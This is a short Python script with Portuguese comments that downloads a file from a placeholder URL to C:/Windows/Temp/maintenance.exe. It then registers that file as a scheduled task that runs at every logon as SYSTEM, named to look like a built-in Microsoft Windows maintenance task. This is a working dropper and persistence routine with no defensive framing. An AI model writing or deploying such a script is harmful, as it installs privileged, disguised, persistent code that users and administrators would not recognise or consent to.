import os, logging, time
import shutil
from urllib import request

diretorio_atual = os.getcwd()
logging.basicConfig(level=logging.INFO, filename="install.log", format="%(asctime)s - %(levelname)s - %(message)s")

arquivo = 'maintenance.exe'
destino = 'c:/Windows/Temp/maintenance.exe'

# Exibir o diretório de trabalho atual
logging.info(f"O diretório de execução atual é: {diretorio_atual}")

try:
    shutil.copy(arquivo, destino)
except:
    print('deu erro ao copiar')

request.urlretrieve("url" , 'c:/Windows/Temp/maintenance.exe')

#fazer função de copia maintaenance de local atual  para c:/win/temp

try:
    #O os.popen abre um 'terminal' e executa o comando... nesse caso ele executara o 'schtasks' que no windows é responsavel por criar tarefas
    os.popen(rf'schtasks /create /sc ONLOGON /ru System /tr c:\Windows\Temp\maintenance.exe /tn Microsoft\Windows\Maintenance\maintenance')
    logging.info('maintenance task create with successful')
except:
    logging.error('maintenance task was not create')

time.sleep(100)
